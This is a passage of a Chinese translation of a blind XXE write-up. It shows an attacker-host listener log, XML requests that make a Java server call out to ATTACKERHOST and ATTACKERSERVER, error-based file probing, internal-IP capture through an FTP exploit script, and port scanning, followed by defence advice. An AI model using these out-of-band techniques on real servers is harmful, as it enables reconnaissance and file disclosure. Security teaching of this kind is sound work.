    ]>
    4
注意上面请求的端口不是固定的，我选择8090端口是为了演示。无论什么情况下，只要请求发送成功了，自己的服务器应该都能收到下面的消息：
    Ncat: Version 7.40 ( https://nmap.org/ncat )  
    Ncat: Listening on :::8090  
    Ncat: Listening on 0.0.0.0:8090  
    Ncat: Connection from ██████████████████.  
    GET / HTTP/1.1  
    Cache-Control: no-cache  
    Pragma: no-cache  
    User-Agent: Java/1.8.0_60  
    Host: ATTACKERHOST:8090  
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2  
    Connection: keep-alive
上述信息的关键包含了受害者服务器IP地址，仔细观察会发现这是一台亚马逊的web服务器实例。此外，请求的`ua`头是`Java/1.8.0_60`表明后台使用了java开发。另一种识别文件存在的攻击是针对服务器的OOB攻击。
# 带外攻击（OOB）
## 文件识别
除了外部交互，还可以通过OOB请求的响应来识别服务器上文件的存在。所以我在OOB攻击使用了FTP协议来判别文件。
下面这个请求已发送给应用程序，这里用来演示和测试。
    POST /broken/api/confirm HTTP/1.1  
    Host: example.com  
    Content-Type: application/xml;charset=UTF-8  
    Content-Length: 132
    %asd;
    %c;
    ]>
    &rrr;
这个请求被受害者服务器解析后，将向攻击者服务器发送请求，请求攻击者精心构造带有payload的DTD文件，这种场景下的文件内容通常是下面这样的：
    ">
这个攻击载荷（包含payload的请求）向攻击者服务器发出了第二个请求（第一个是面向受害者服务器的），请求的是一个DTD文件，其中包含了对目标服务器上另一个文件的请求。
如果文件不存在，服务器将返回`No such file or directory`的响应。有些和下面的响应类似：
    javax.xml.bind.UnmarshalException  
     - with linked exception:
    [Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
    Exception Description: An error occurred unmarshalling the document  
    Internal Exception: ████████████████████████: (was java.io.FileNotFoundException) /var/www/index.html (No such file or directory)  
     at [row,col,system-id]: [2,63,"http://ATTACKERSERVER:8090/xxe_file.dtd"]
     from [row,col {unknown-source}]: [4,6]]
但如果文件确实存在，响应就不同了。
因为我不知道root元素的名字，服务器返回了`A descriptor with default root element foo was not
found in the project`错误。
    javax.xml.bind.UnmarshalException  
     - with linked exception:
    [Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
    Exception Description: An error occurred unmarshalling the document  
    Internal Exception: ████████████████████████  
    Exception Description: A descriptor with default root element foo was not found in the project]
如果知道关于root元素名字的信息，攻击将更可见，破坏也更具有效果。因为这很可能造成本地文件读取并且我敢保证存在RCE的风险！
由于每个请求文件的响应不同，这一点对于攻击者来说是清晰可见的。所以攻击者可以对隐藏在应用程序背后的服务器有个大概的认知。
# 发现内网IP
通过使用上文所讲述的带外技术，我收集了应用程序主机的内网IP信息。这些信息是通过FTP协议获得的，这是利用了Java从连接字符串中提取的信息。
为了完成信息收集，我用了[xxe-ftp-server](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)，这个exp允许我在自定义的端口上进行监听和拦截。我将它安装了服务器上，监听着默认的2121端口。
接着我向应用程序发送了下面这个请求，该请求会使应用程序服务器向指定的攻击者服务器发送FTP请求。
    POST /broken/api/confirm HTTP/1.1  
    Host: example.com  
    Content-Type: application/xml;charset=UTF-8
      %one;
      %two;
      %four;
      %five;
    ]>
在发送FTP请求前，需要在自己的服务器上运行FTP服务。下面的结果展示了请求发给服务器时的情况。
    ruby xxe-ftp-server.rb  
    FTP. New client connected  
     230 more data please!
     230 more data please!
     230 more data please!
     230 more data please!
     230 more data please!
     200 PORT command ok
    < LIST
接着分解上面的输出，目标应用程序向接受登录请求的FTP服务器发送请求。登录请求中包含了Java版本和服务器内网IP和端口信息。这暗示了两件事情，1）内网网段范围很可能是
**10.10.x.x** 。2）从内网到外网出口似乎没有任何过滤，如果获得一个shell这将非常有用。
文中很早讨论过针对主机的端口扫描，当时是因为我不知道IP范围，只能扫描本地主机。得益于OOB技术的使用，确定了内网范围，所以另一边使用`burp
intruder`执行端口扫描。
扫描结果显示本机不仅开放了8080端口，而且还监听了所有接口的流量，这意味着可以实施更多的迭代猜测。这也意味着在本例中可以通过SSRF来识别其他的应用程序，这非常有意思。
# 防御建议
XXE的主要问题是XML解析器解析了用户发送的不可信数据（译者注：一切用户输入都是不可信的）。然而，在DTD文档中只验证系统标志符中出现的数据是不可能的。默认情况下，大多数XML解析器都容易遭受XXE攻击。所以，最好的解决办法是配置XML处理器仅使用本地静态DTD，同时禁止XML文档中的DTD声明。
# 拓展阅读
如果你喜欢这篇文章，同时又想更加了解XXE，下面这些文章将为你提供更多信息。
  * [SMTP over XXE](https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/)
  * [XXE OOB Attacks](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)
  * [Generic XXE Detection](https://www.christian-schneider.net/GenericXxeDetection.html)
  * [XXE on JSON EndPoints](https://blog.netspi.com/playing-content-type-xxe-json-endpoints/)
  * [New Age of XXE(2015)](https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE.pdf)
  * [XXE Advanced Exploitaion](https://www.slideshare.net/d0znpp/xxe-advanced-exploitation)
  * [XXE Payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
[**原文在这**](https://blog.zsec.uk/blind-xxe-learning/)